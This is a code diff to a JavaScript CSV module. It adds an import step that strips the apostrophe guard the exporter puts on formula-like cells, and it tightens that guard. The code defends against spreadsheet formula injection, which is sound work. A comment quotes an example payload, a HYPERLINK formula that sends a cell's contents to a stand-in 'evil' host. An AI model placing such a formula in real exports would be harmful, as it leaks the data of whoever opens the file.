@@ -47,6 +47,20 @@ function parseCsv(text) {
 }
 
 /**
+ * Undo the formula guard csvCell() puts on a cell (see below).
+ *
+ * The export prefixes an apostrophe to anything a spreadsheet would run, and
+ * the import never took it off: "+1 Networking Add-on" came back as
+ * "'+1 Networking Add-on", and a re-import without the key column matched no
+ * package by that name and added a duplicate. Only the exact prefix is
+ * removed — one apostrophe, ahead of one of the characters the guard exists
+ * for (or of a value that was itself guarded) — so a value that merely starts
+ * with an apostrophe is left as typed.
+ */
+const GUARDED = /^'(?='*[=+\-@\t\r])/;
+const unguard = (s) => String(s).replace(GUARDED, '');
+
+/**
  * Parse into objects keyed by the header row.
  *
  * Headers are matched loosely — case-insensitive, ignoring spaces, underscores
@@ -60,7 +74,7 @@ function parseCsvObjects(text) {
   const headers = rows[0].map(norm);
   const out = rows.slice(1).map((r, idx) => {
     const o = { __line: idx + 2 };            // 1-based, counting the header
-    headers.forEach((h, i) => { if (h) o[h] = r[i] == null ? '' : String(r[i]).trim(); });
+    headers.forEach((h, i) => { if (h) o[h] = r[i] == null ? '' : unguard(String(r[i]).trim()); });
     return o;
   });
   return { headers, rows: out };
@@ -75,7 +89,12 @@ function parseCsvObjects(text) {
  * =HYPERLINK("https://evil/?"&A1,"Click") therefore runs on the machine of
  * whoever opens the export — the attacker never has to touch that machine.
  * Prefixing an apostrophe makes the spreadsheet read the cell as text; the
- * apostrophe itself is not shown in the cell.
+ * apostrophe itself is not shown in the cell. The import takes it off again
+ * (unguard, above).
+ *
+ * A value that already starts with that exact prefix is guarded too, so the
+ * import's stripping gives back what was stored rather than eating a real
+ * apostrophe: "'=x" goes out as "''=x" and comes back as "'=x".
  *
  * Plain numbers are exempt, so a negative price still imports as a number
  * instead of arriving as the text "-1200".
@@ -85,7 +104,7 @@ const PLAIN_NUMBER  = /^-?\d+(\.\d+)?$/;
 
 function csvCell(v) {
   let s = v == null ? '' : String(v);
-  if (FORMULA_START.test(s) && !PLAIN_NUMBER.test(s)) s = `'${s}`;
+  if ((FORMULA_START.test(s) && !PLAIN_NUMBER.test(s)) || /^'+[=+\-@\t\r]/.test(s)) s = `'${s}`;
   return /[",\r\n]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
 }
 
